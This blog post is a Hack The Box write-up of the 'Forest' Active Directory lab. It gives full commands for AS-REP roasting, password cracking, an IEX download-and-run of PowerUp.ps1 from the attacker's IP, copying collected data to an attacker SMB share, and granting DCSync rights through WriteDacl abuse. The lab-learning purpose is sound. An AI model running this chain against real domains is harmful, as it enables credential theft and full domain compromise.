---
layout: post
title:  "Forest Writeup - Hack The Box"
date:   2025-07-17
desc: ""
keywords: "HTB,OSEP,eCPPTv3,OSCP,Active Directory,Windows,RPC Enumeration,AS-RepRoast attack,Cracking,BloodHound,Abusing Accunt Operators Group,Abusing WriteDacl,DCSync Exploitation,Secretsdump,Easy"
categories: [HTB]
tags: [HTB,OSEP,eCPPTv3,OSCP,Active Directory,Windows,RPC Enumeration,AS-RepRoast attack,Cracking,BloodHound,Abusing Accunt Operators Group,Abusing WriteDacl,DCSync Exploitation,Secretsdump,Easy]
icon: icon-htb
---

> **Disclaimer:** The ***writeups*** that I do on the different machines that I try to vulnerate, cover all the actions that I perform, even those that could be considered wrong, I consider that they are an essential part of the **learning curve** to become a **good professional**. So it can become very extensive content, if you are looking for something more direct, you should look for another site, there are many and of higher quality and different resolutions, moreover, I advocate that it is part of learning to consult different sources, to obtain greater expertise.

<br /><br />
<img src="{{ site.img_path }}/forest_writeup/Forest.png" width="100%" style="margin: 0 auto;display: block; max-width: 600px;">
<br /><br />

An **Easy [Hack The Box](https://www.hackthebox.com){:target="_blank"}** machine that is <ins>not so easy</ins>, since it includes many basic concepts to advance slowly in the **Engagement** of it. I found it very interesting already from the beginning because again I had to research about the multiple protocols and technologies surrounding the **Windows OS**. The idea that this **OS** is my favorite to attack, makes the task of researching, trying different methods, using different exploits, even more fun. It took me a long time to finish the box, but it left me with a huge sense of satisfaction of a job completed and new concepts assimilated. I'm going to spawn the machine to start my writeup.

<br /><br />
<img src="{{ site.img_path }}/forest_writeup/Forest_00.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

With a trace sent with `ping` I confirm that I already have connectivity with the lab through a **VPN**, also with the **[hack4u](https://hack4u.io/){:target="_blank"}** tool, `whichSystem.py`, I get the **TTL** value and with this data I have a high level of certainty that the **OS** of the box is **Windows**. I can now use another great tool that every pentester should learn to manipulate, `nmap`, and I manage to leak the list of open ports (very extensive, typical of **Windows**). With the same tool I can obtain the services and their versions, I make a mental map of the different protocols (**Kerberos**, **Windows RPC**, **LDAP**, etc) that I will have to investigate to find vulnerabilities or misconfigurations that allow me to compromise the machine, I find very varied information (**domain name**, **FQDN**, **OS version**, and others) that already give me a general overview of my objective and also now I know that I'm in front of an **Active Directory**.

> **Active Directory** (**AD**) is a directory service developed by **Microsoft** that manages and organizes users, computers, and other network resources within a **Windows** domain environment. It essentially acts as a central database and set of services that streamline network administration by providing a structured way to store and manage information about network objects and their relationships, enabling secure access to resources.

```bash
ping -c 2 10.10.10.161
whichSystem.py 10.10.10.161
sudo nmap -sS --min-rate 5000 -p- --open -vvv -n -Pn 10.10.10.161 -oG allPorts
nmap -sCV -p53,88,135,139,389,445,464,593,636,3269,5985,9389,47001,49664,49665,49666,49667,49671,49676,49677,49684,49706,49952 10.10.10.161 -oN targeted
cat targeted
# Microsoft Windows Active Directory LDAP (Domain: htb.local)
# FQDN: FOREST.htb.local
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_01.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_02.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_03.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_04.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_05.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

The first thing I do is to try to enumerate the system through the **SMB** protocol, for this I use tools like `smbclient` or `smbmap` but I don't have credentials and it doesn't allow me to connect as a **guest** or without entering a password. But through the **RPC** protocol, I can enumerate users and groups of the domain with the `rpcclient` tool, I confirm that there is only one account belonging to the **Admins** group (the **Administrator**) and there is no sensitive information that could help me to find a possible attack vector at the moment, unless I am missing something.

```bash
smbclient -L 10.10.10.161 -N
smbmap -H 10.10.10.161 -u 'null' --no-banner
smbclient -L 10.10.10.161 -U 'guest'
rpcclient -U '' 10.10.10.161 -N
  enumdomusers
  enumdomgroups

# List accounts by groups
rpcclient -U '' 10.10.10.161 -N -c "enumdomusers" | head -n 5
rpcclient -U '' 10.10.10.161 -N -c "enumdomgroups" | head -n 5

# group: Admins
rpcclient -U '' 10.10.10.161 -N -c "querygroupmem 0x200"
rpcclient -U "" 10.10.10.161 -N -c "querygroupmem 0x200" | awk '{print $1}' | grep -oP '\[.*?\]'
rpcclient -U "" 10.10.10.161 -N -c "querygroupmem 0x200" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]'

rpcclient -U '' 10.10.10.161 -N -c "queryuser 0x1f4" | head -n 4
rpcclient -U '' 10.10.10.161 -N -c "queryuser 0x1f4" | grep "User Name" | awk 'NF{print $NF}'
rpcclient -U "" 10.10.10.161 -N -c "querygroupmem 0x200" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do echo "$rid: $(rpcclient -U '' 10.10.10.161 -N -c "queryuser $rid" | grep "User Name" | awk 'NF{print $NF}')"; done

# group: Privileged IT Accounts
rpcclient -U "" 10.10.10.161 -N -c "querygroupmem 0x47d" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do echo "$rid: $(rpcclient -U '' 10.10.10.161 -N -c "queryuser $rid" | grep "User Name" | awk 'NF{print $NF}')"; done

rpcclient -U "" 10.10.10.161 -N -c "querygroupmem 0x204" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | while read rid; do echo "$rid: $(rpcclient -U '' 10.10.10.161 -N -c "queryuser $rid" | grep "User Name" | awk 'NF{print $NF}')"; done
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_06.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_07.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_08.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_09.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_10.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Something I overlooked and should have done before starting my connection attempts is to learn more about my target with `crackmapexec`, which shows me on screen detailed information about the machine and even that the **SMB** protocol is **signed** (good preventive measure to avoid **[SMB Relay Attacks](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/){:target="_blank"}**). I continue my research, now targeting the **Domain Name System** (**DNS**) protocol and with `dig` I try to search for subdomain and even try to exploit an **AXFR** unsuccessfully. If I add the full domain name (**FQDN**) to my **hosts** file and try again to leak information through the **DNS** protocol, I get better results but they don't help me much at the moment.

> **[Relay Attacks](https://tcm-sec.com/smb-relay-attacks-and-how-to-prevent-them/){:target="_blank"}**: The core vulnerability of **SMB** to relay attacks stems from its authentication mechanism, especially when using **NTLM**. When a user seeks access to a shared resource, **SMB** initiates a connection and authenticates the **Active Directory** user. Attackers can seize this authentication attempt, relaying it to a different server to impersonate the user. The lack of SMB’s validation (via **SMB signing**) of the authentication request’s origin or destination allows attackers to exploit it for unauthorized access.

```bash
crackmapexec smb 10.10.10.161
dig @10.10.10.161
dig @10.10.10.161 ns
dig @10.10.10.161 mx
dig @10.10.10.161 axfr
# :(

nvim /etc/hosts
cat /etc/hosts | tail -n 1
# 10.10.10.161  htb.local forest.htb.local

dig @10.10.10.161 forest.htb.local
dig @10.10.10.161 forest.htb.local ns
dig @10.10.10.161 forest.htb.local mx
dig @10.10.10.161 forest.htb.local axfr
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_11.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_12.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_13.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_14.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_15.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_16.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I'm running out of protocols to attack, but I have **[Kerberos](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-kerberos-88/index.html?highlight=port%2088#hacktricks-automatic-commands){:target="_blank"}** available, and what I can do is get a list of user accounts with `rpcclient` (being careful that there are no repeats) or even with the **[`rpcenum` tool of S4vitar](https://github.com/s4vitar/rpcenum){:target="_blank"}** and then perform a brute force attack with **[`kerbrute`](https://github.com/ropnop/kerbrute){:target="_blank"}** to validate which ones are valid and even this tool succeeds in dumping a hash to try to crack on my machine or with online tools. Unfortunately neither with `john` or other tools can I get the password in clear text.

> **[Kerberos](https://www.techtarget.com/searchsecurity/definition/Kerberos){:target="_blank"}** is a protocol for authenticating service requests between trusted hosts across an untrusted network, such as the internet. By providing a gateway between users and a network, **Kerberos** helps verify the identities of users and hosts, and it keeps unauthorized or malicious users out of a private network. **Kerberos** support is built into all major computer operating systems (**OSes**), including **Microsoft Windows**, **Apple macOS**, **FreeBSD**, **Unix** and **Linux**.

> **[kerbrute](https://github.com/ropnop/kerbrute){:target="_blank"}**: A tool to quickly bruteforce and enumerate **valid Active Directory accounts** through **Kerberos Pre-Authentication**.

> **Kerberos**, in its standard implementation like **Kerberos 5**, does require pre-authentication. **Pre-authentication** is a process where the client proves it knows the user's password hash before the **Kerberos Key Distribution Center** (**KDC**) issues a **Ticket Granting Ticket** (**TGT**). This helps prevent certain attacks. While older Kerberos versions didn't always require it, Kerberos 5 made pre-authentication a standard part of the authentication process.

```bash
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | tail -n 5
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | wc -l
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' | sort -u | wc -l
rpcclient -U "" 10.10.10.161 -N -c "enumdomusers" | awk '{print $1}' | grep -oP '\[.*?\]' | tr -d '[]' > users.txt

./rpcenum --help
./rpcenum -i 10.10.10.161 -e All

kerbrute userenum --dc 10.10.10.161 -d htb.local ./users.txt
# 2025/06/25 19:36:09 >  [+] svc-alfresco has no pre auth required. Dumping hash to crack offline:      :)
# 2025/06/25 19:36:14 >  Done! Tested 31 usernames (18 valid) in 5.398 seconds

nvim hash
cat !$
john -w=$(locate rockyou.txt)                       # [Tab]
john -w=/usr/share/wordlists/rockyou.txt hash
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_17.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_18.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_19.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_20.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_21.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_22.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_23.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

It seems to me that the **Kerberos** protocol is not well configured and I try an **[AS-REP Roasting attack](https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004){:target="_blank"}** to obtain a **TGT** of some account from the list that I could obtain, I only have to use the **[`impacket-GetNPUsers`](https://tools.thehacker.recipes/impacket/examples/getnpusers.py){:target="_blank"}** tool and indicate that I'm not going to enter a password (flag ***-no-pass***) and specify the IP address of the **Domain Controller** (parameter ***-dc-ip***). After a not very long wait I get a **TGT** and with `john`, this time I succeed in cracking the hash. With `crackmapexec` I validate the credentials and also check that I can connect using **WinRM**, so with `evil-winrm` I can access the machine. First phase accomplished.

> The **[AS-REP Roasting attack](https://www.picussecurity.com/resource/blog/as-rep-roasting-attack-explained-mitre-attack-t1558.004){:target="_blank"}** is a technique targeting **Kerberos**, a network authentication protocol used in various IT infrastructures. This attack focuses on user accounts that have disabled the **Kerberos preauthentication feature**.

> In a **standard Kerberos authentication flow**, when pre-authentication is active, the user initiates the process by transmitting an **Authentication Server Request** (**AS-REQ**) to the domain controller (**DC**). This message includes a timestamp encrypted using the **hash of the user's password**. The **DC**, upon receipt, tries to decrypt the timestamp using its stored version of the user's password hash. If successful, the **DC** acknowledges the authentication by replying with an **Authentication Server Response** (**AS-REP**), which houses a **Ticket Granting Ticket** (**TGT**) issued by the **Key Distribution Center** (**KDC*+). This **TGT** is pivotal for the user's subsequent access requests within the domain.
However, if pre-authentication is disabled, the **DC** prematurely sends an **AS-REP** upon receiving an **AS-REQ**. This response includes sensitive data, with segments encrypted using the **user's password hash**. This vulnerability allows attackers to extract this encrypted data without initially providing any valid authentication details. Once obtained, attackers can perform offline brute-force or dictionary attacks to obtain the user's password. In essence, the **AS-REP Roasting technique** exploits the **gap** in the Kerberos authentication mechanism that arises when pre-authentication is deactivated, allowing adversaries to gain unauthorized access to critical domain assets.

```bash
impacket-GetNPUsers --help
# Queries target domain for users with 'Do not require Kerberos preauthentication' set and export their TGTs for cracking

for user in $(cat users.txt); do impacket-GetNPUsers htb/$user -no-pass -dc-ip 10.10.10.161; done | grep -v Impacket

nvim hash
cat !$
john -w=/usr/share/wordlists/rockyou.txt hash

crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p '...'
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p '...'
evil-winrm -i 10.10.10.161 -u 'svc-alfresco' -p '...'

whoami
hostname
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_24.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_25.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_26.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_27.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_28.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_29.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

After inspecting the **DC** file system and also the privileges of the account I managed to compromise, I don't find much valuable information, so I'm going to resort to **[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1){:target="_blank"}** to look for vectors that allow me to **Escalate privileges**. After trying different methods to transfer the script to the victim machine and once I succeed, unfortunately I can't import the module so the **cmdlet** (command-let - specialized command) **Invoke-AllCheckes** doesn't succeed to be recognized by the system.

> **[PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1){:target="_blank"}**: **PowerUp** aims to be a clearinghouse of **common Windows privilege escalation vectors** that rely on misconfigurations.

> **Victime Machine**:

```cmd
whoami /priv
whoami /all
cd C:\
dir -force
cd C:\Users\svc-alfresco\AppData\Local\Temp
dir -force
systeminfo
# :(
```

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1
nvim PowerUp.ps1
cat PowerUp.ps1 | tail -n 1
# Invoke-AllChecks
python3 -m http.server 80
```

> **Victime Machine**:

```cmd
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.2/PowerUp.ps1')
# Access denied     :(
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username al3j0 -password al3j0123
```

> **Victime Machine**:

```cmd
net use \\10.10.14.2\smbFolder /u:al3j0 al3j0123
copy \\10.10.14.2\smbFolder\PowerUp.ps1 .\PowerUp.ps1
# :)

Import-Module .\PowerUp.ps1
Invoke-AllChechs | Out-File -Encoding ASCII enumeration_result.txt
# :(
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_30.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_31.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_32.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_33.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Another tool I can use to automate the search for attack vectors is **[BloodHound](https://github.com/SpecterOps/BloodHound-Legacy){:target="_blank"}**, but first I will transfer the **[`SharpHound.exe`](https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe){:target="_blank"}** information collector to the **DC**, starting an **SMB server** with credentials so I can access from the victim machine to the shared resource and download the binary. Unfortunately the collector is not compatible with the **DC's OS platform**, but if I transfer an older version of the executable **[SharpHound.exe](https://github.com/SpecterOps/BloodHound-Legacy/releases){:target="_blank"}**, this time I succeed in getting it to run correctly. My next step is to collect everything, but using the compromised account credentials, I can now transfer the collected information (compressed into a **.zip** file) to my machine. I install `neo4j` and `bloodhound`, then I start the **DB manager** and I can run the tool, which unfortunately is not compatible with my version of **postgres**.

> **Attacker Machine**:

```bash
wget https://github.com/SpecterOps/BloodHound-Legacy/blob/master/Collectors/SharpHound.exe
impacket-smbserver smbFolder $(pwd) -smb2support -username al3j0 -password al3j0123
```

> **Victime Machine**:

```cmd
copy \\10.10.14.2\smbFolder\SharpHound.exe .\SharpHound.exe
.\SharpHound.exe --help
# The specified executable is not a valid application for this OS platform :(
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username al3j0 -password al3j0123
```

> **Victime Machine**:

```cmd
copy \\10.10.14.2\smbFolder\SharpHound.exe .\SharpHound.exe
.\SharpHound.exe --help
# :)
.\SharpHound.exe -c all --ldapusername svc-alfresco --ldappassword s3rvice
```

> **Attacker Machine**:

```bash
impacket-smbserver smbFolder $(pwd) -smb2support -username al3j0 -password al3j0123
```

> **Victime Machine**:

```cmd
copy .\20250626102028_BloodHound.zip \\10.10.14.2\smbFolder\20250626102028_BloodHound.zip
```

> **Attacker Machine**:

```bash
apt install neo4j bloodhound -y
neo4j console
bloodhound &>/dev/null & disown
# :( ??

apt remove neo4j bloodhound -y
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_34.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_35.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_36.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_37.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_38.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_39.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_40.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_41.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

A great help from the **[hack4u](https://hack4u.io/){:target="_blank"}** community, guided me in **[installing BloodHound but using Docker](https://bloodhound.specterops.io/get-started/quickstart/community-edition-quickstart){:target="_blank"}**, so I performed a container cleanup on my machine. Now I can download the project from **Github** and use `bloodhound-cli` to perform the creation of the new containers with all the necessary tools, **paying attention to the messages** of the whole process to get the generated credentials (which I will have to update in my first login) and this way I can use this great tool.

```bash
docker rm $(docker ps -a -q) --force
docker rmi $(docker images -q)
docker volume rm $(docker volume ls -q)
docker network rm $(docker network ls -q)

wget https://github.com/SpecterOps/bloodhound-cli/releases/latest/download/bloodhound-cli-linux-amd64.tar.gz
tar -xvzf bloodhound-cli-linux-amd64.tar.gz
./bloodhound-cli install

http://127.0.0.1:8080/ui/login
# :)
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_42.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_43.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_44.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_45.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_46.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_47.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

I can already upload the sample I got from the **DC** into the **BloodHound file ingestor**, but this particular compressed file cannot be processed, perhaps because of some problem with the `SharpHound.exe` collector. Another tool that can help me to perform a collection, but remotely, is `bloodhound-python`. For the tool to work and succeed in obtaining all the necessary information is to use **all the necessary flags** and **credentials** I have. This time **BloodHound** succeeds in processing the sample.

```bash
# http://127.0.0.1:8080/ui/login
# :)
# Administration -> Upload File
# :(

bloodhound-python -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.161 -d htb.local -c All --zip
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_48.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_49.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_50.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_51.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_52.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_53.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_54.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_55.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Since I count a compromised account, I inform the tool that I own it, then I can start my research on vectors to **Escalate Privileges**. I analyze the shortest path to succeed in becoming a **Domain Administrator**, and **BloodHound** already finds one, as the account I have compromised belongs to the **Service Accounts** group I'm also part of the **Privilege IT Accounts** group. The latter group has full control (**[GenericAll](https://bloodhound.specterops.io/resources/edges/generic-all){:target="_blank"}**) over the **Exchange Windows Permissions** group, which has write permissions on the **DACL**. **BloodHound** informs me that I have the ability to **[create an account in the domain](https://security.stackexchange.com/questions/45332/creating-a-domain-admin-account-from-nt-system-access){:target="_blank"}**, so I run a test and indeed **I can**.

> A **[service account](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-service-accounts){:target="_blank"}** is a user account that's created explicitly to provide a security context for services that are running on **Windows Server** operating systems. The security context determines the service's ability to access local and network resources.

> **Privileged IT accounts** in Microsoft environments refer to user accounts or groups with elevated permissions and access rights, often granting them control over critical systems and data. These accounts, such as **Domain Admins** or **Enterprise Admins** in **Active Directory**, are prime targets for attackers and require strict security measures to prevent unauthorized access and potential breaches.

> The **Account Operators** group in **Microsoft Active Directory** has **limited account creation privileges**. Members of this group can **create**, **modify**, and **delete user**, **group**, and **computer accounts**, but cannot manage the built-in Administrator account, the Server Operators group, or the Domain Admins group. They can also log in locally to domain controllers, but not manage the accounts of administrators or members of the administrator groups.

> **GenericAll**: This is also known as **full control**. This privilege allows the trustee to **manipulate** the target object however they wish.

```cmd
# http://127.0.0.1:8080/ui/explore
# CYPHER --> Shortest paths to Domain Admins
# svc-alfresco - [MemberOf] - SERVICE ACCOUNTS - [MemberOf] - PRIVILEGED IT ACCOUNTS - [MemberOf] - ACCOUNT OPERATORS -
# [GenericAll] - EXCHANGE WINDOWS PERMISSIONS - [WriteDacl]

net user
net user oldb0y oldb0y123 /ADD /DOMAIN
net user
```

<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_56.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_57.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_58.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_59.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_60.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_61.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br />
<img src="{{ site.img_path }}/forest_writeup/Forest_62.png" width="100%" style="margin: 0 auto;display: block; max-width: 900px;">
<br /><br />

Thanks to **BloodHound** I know that I can add the new account created above to the **Exchange Windows Permissions** group. Once I belong to this group I can manipulate the **[DACLs](https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces){:target="_blank"}** to attempt a **[DCSync attack](https://www.semperis.com/blog/dcsync-attack/){:target="_blank"}** and try to steal credentials from the **Domain Controller Database**. One inconvenient I have now is that I cannot grant **DCSync permissions** to the new account with `Add-DomainObjectAcl` cmdlet, because it is not recognized by the system. Thanks to the **[`PowerView.ps1`](https://github.com/PowerShellMafia/PowerSploit){:target="_blank"}** script that I succeed to transfer and import it as a new module to the victim machine, I can now run `Add-DomainObjectAcl`, but after correcting it since the first time it doesn't work (thanks again to the contribution of the  community). Already in my attacking machine I check with `crackmapexec` that the new account is accessible and with `impacket-secretsdump` I succeed to obtain the password hashes of the domain accounts. Again I use `crackmapexec` to validate that the **Administrator account** hash is valid and that I can connect through **WinRM**. Now I can connect with `evil-winrm` or even `impacket-psexec` performing a **PassTheHash** attack and access the last flag. I clean **Docker** y finished machine.

> In **Microsoft Exchange**, managing permissions involves controlling who has access to what within the **Exchange environment**, including mailboxes, features, and administrative roles. **Exchange** utilizes **Role Based Access Control** (**RBAC**) to assign permissions to administrators and users, allowing them to perform specific tasks.

> **Exchange Windows Permissions**: It has a set of permissions related to **Exchange**, including the **"WriteDacl"** permission, which allows modification of permissions on the domain root, according to ADSecurity.org.

> **[DACL](https://learn.microsoft.com/en-us/windows/win32/secauthz/dacls-and-aces){:target="_blank"}**: An **access control list** that is controlled by the owner of an object and that specifies the access particular users or groups can have to the object.

- To abuse **WriteDacl** to a domain object, you may grant yourself **DCSync permissions**.
- You may need to authenticate to the Domain Controller as a member of **EXCHANGE WINDOWS PERMISSIONS**.
- To do this in conjunction with `Add-DomainObjectAcl`.

> A **[DCSync attack](https://www.semperis.com/blog/dcsync-attack/){:target="_blank"}** is an attack technique that is typically used to steal credentials from an **AD database**. The attacker impersonates a domain controller (**DC**) to request password hashes from a target **DC**, using the **Directory Replication Services** (**DRS**) **Remote Protocol**. The attack can be used to effectively **“pull”** password hashes from the **DC**, without needing to run code on the **DC** itself. This type of attack is adept at bypassing traditional auditing and detection methods. Note that **the attacker must first gain access to an account with high-level permissions**, such as **Domain Admin** or an account with the ability to replicate data from the DC.

> **`Add-DomainObjectAcl`**: It's not a default **PowerShell cmdlet**. You have to get the `Powerview.ps1` module and source it, in order to use the the commands it offers.

> **[`PowerView`](https://powersploit.readthedocs.io/en/latest/Recon/){:target="_blank"}** is a **PowerShell tool** to gain network situational awareness on **Windows domains**. It contains a set of **pure-PowerShell replacements** for various windows **`net *`** commands, which utilize **PowerShell AD hooks** and underlying Win32 API functions to perform useful Windows domain functionality.

> **Victime Machine**:

```cmd
net group
# *Exchange Windows Permissions
net group "EXCHANGE WINDOWS PERMISSIONS" /add oldb0y
net user oldb0y

$SecPassword = ConvertTo-SecureString 'oldb0y123' -AsPlainText -Force
$Cred = New-Object System.Management.Automation.PSCredential('htb\oldb0y', $SecPassword)
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
# The term 'Add-DomainObjectAcl' is not recognized as the name of a cmdlet      :(
```

> **Attacker Machine**:

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Recon/PowerView.ps1
impacket-smbserver smbFolder $(pwd) -smb2support -username al3j0 -password al3j0123
```

> **Victime Machine**:

```cmd
copy \\10.10.14.2\smbFolder\PowerView.ps1 .\PowerView.ps1
Import-Module .\PowerView.ps1
Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync
# :(
Add-DomainObjectAcl -Credential $Cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity oldb0y -Rights DCSync
# :)
```

